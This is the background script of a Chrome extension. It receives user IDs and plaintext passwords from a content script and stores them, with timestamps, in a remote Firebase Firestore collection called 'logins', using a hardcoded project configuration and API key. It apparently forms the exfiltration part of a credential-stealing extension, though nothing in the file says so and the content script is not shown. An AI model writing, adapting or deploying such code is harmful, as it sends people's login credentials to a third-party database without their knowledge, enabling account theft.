// background.js (must be treated as a module in manifest)
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDn9r1cZyYBxb8pYCauPN43_1NTcFhlCXQ",
  authDomain: "featherwood-ed786.firebaseapp.com",
  projectId: "featherwood-ed786",
  storageBucket: "featherwood-ed786.firebasestorage.app",
  messagingSenderId: "527110619279",
  appId: "1:527110619279:web:de9eb63b883be68a27f0fa",
  measurementId: "G-G4FPE1EJMN"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Listen for messages from content.js
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "SAVE_TO_FIREBASE") {
    const { userid, password, timestamp } = request.payload;

    addDoc(collection(db, "logins"), {
      userid,
      password,
      timestamp
    })
    .then(() => {
      console.log("✅ Data saved to Firebase");
    })
    .catch((error) => {
      console.error("❌ Error saving to Firebase:", error);
    });
  }
});
